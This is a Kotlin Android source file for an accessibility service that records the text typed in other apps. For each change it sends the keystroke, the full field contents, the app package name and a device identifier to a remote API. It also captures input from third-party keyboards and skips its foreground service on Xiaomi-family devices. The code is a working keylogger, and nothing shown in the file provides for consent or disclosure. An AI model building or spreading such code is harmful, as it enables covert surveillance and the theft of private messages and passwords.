package com.keywordrecord.keyboard

import android.accessibilityservice.AccessibilityService
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class TypingAccessibilityService : AccessibilityService() {

    private lateinit var apiClient: ApiClient
    private lateinit var deviceUniqueId: String
    private val handler = Handler(Looper.getMainLooper())
    private val fieldStates = mutableMapOf<String, String>()
    private var pendingRecordKey: String? = null
    private var pendingRecordAction: String? = null
    private var pendingFullText: String? = null
    private var pendingAppPackage: String? = null
    private var lastEventTime = 0L
    private var eventsThisSecond = 0

    private val flushRunnable = Runnable { flushPendingRecordSafe() }

    override fun onServiceConnected() {
        super.onServiceConnected()
        try {
            apiClient = ApiClient(this)
            deviceUniqueId = DeviceIdManager.getDeviceUniqueId(this)
            if (!isMiuiDevice()) {
                RecordingForegroundService.start(this)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Service connected with errors", e)
        }
    }

    override fun onDestroy() {
        handler.removeCallbacks(flushRunnable)
        RecordingForegroundService.stop(this)
        super.onDestroy()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        try {
            if (event == null) return
            if (KeyboardIME.isInputActive) return
            if (!allowEvent()) return

            val packageName = event.packageName?.toString()?.trim().orEmpty()
            if (packageName.isEmpty() || packageName == applicationContext.packageName) return

            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    handlePossibleTextChange(event, packageName)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Event handling failed", e)
        }
    }

    private fun allowEvent(): Boolean {
        val now = System.currentTimeMillis()
        if (now - lastEventTime > 1000) {
            lastEventTime = now
            eventsThisSecond = 0
        }
        eventsThisSecond++
        return eventsThisSecond <= MAX_EVENTS_PER_SECOND
    }

    private fun handlePossibleTextChange(event: AccessibilityEvent, packageName: String) {
        val newText = extractText(event) ?: return
        if (newText.isEmpty()) return

        val fieldKey = "$packageName:${event.className ?: "field"}"
        val previousText = event.beforeText?.toString()?.takeIf { it.isNotEmpty() }
            ?: fieldStates[fieldKey].orEmpty()
        if (newText == previousText) return

        fieldStates[fieldKey] = newText
        val (keyPressed, action) = diffText(previousText, newText)
        queueRecord(keyPressed, newText, packageName, action)
    }

    private fun extractText(event: AccessibilityEvent): String? {
        val fromEvent = event.text?.joinToString("")?.trim()
        if (!fromEvent.isNullOrEmpty()) return fromEvent
        return null
    }

    private fun diffText(previous: String, current: String): Pair<String, String> {
        if (current.length > previous.length && current.startsWith(previous)) {
            val added = current.substring(previous.length)
            return when {
                added == " " -> " " to "space"
                added.contains("\n") -> "↵" to "enter"
                else -> added.take(50) to "accessibility"
            }
        }
        if (current.length < previous.length && previous.startsWith(current)) {
            return "⌫" to "delete"
        }
        return current.take(50) to "accessibility"
    }

    private fun queueRecord(keyPressed: String, fullText: String, appPackage: String, action: String) {
        pendingRecordKey = keyPressed
        pendingRecordAction = action
        pendingFullText = fullText
        pendingAppPackage = appPackage
        handler.removeCallbacks(flushRunnable)
        handler.postDelayed(flushRunnable, 300)
    }

    private fun flushPendingRecordSafe() {
        try {
            flushPendingRecord()
        } catch (e: Exception) {
            Log.e(TAG, "Record flush failed", e)
        }
    }

    private fun flushPendingRecord() {
        if (!::apiClient.isInitialized) return
        val keyPressed = pendingRecordKey ?: return
        val action = pendingRecordAction ?: return
        val fullText = pendingFullText ?: return
        val appPackage = pendingAppPackage ?: return

        pendingRecordKey = null
        pendingRecordAction = null
        pendingFullText = null
        pendingAppPackage = null

        apiClient.recordKeystroke(
            deviceUniqueId = deviceUniqueId,
            keyPressed = keyPressed,
            fullText = fullText,
            appPackage = appPackage,
            action = action
        )
    }

    private fun isMiuiDevice(): Boolean {
        val manufacturer = Build.MANUFACTURER.lowercase()
        return manufacturer.contains("xiaomi") ||
            manufacturer.contains("redmi") ||
            manufacturer.contains("poco")
    }

    override fun onInterrupt() {}

    companion object {
        private const val TAG = "TypingA11y"
        private const val MAX_EVENTS_PER_SECOND = 30

        fun isEnabled(context: android.content.Context): Boolean {
            val enabledServices = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false

            val component = android.content.ComponentName(
                context,
                TypingAccessibilityService::class.java
            ).flattenToString()

            return enabledServices.split(':').any { it.equals(component, ignoreCase = true) }
        }
    }
}
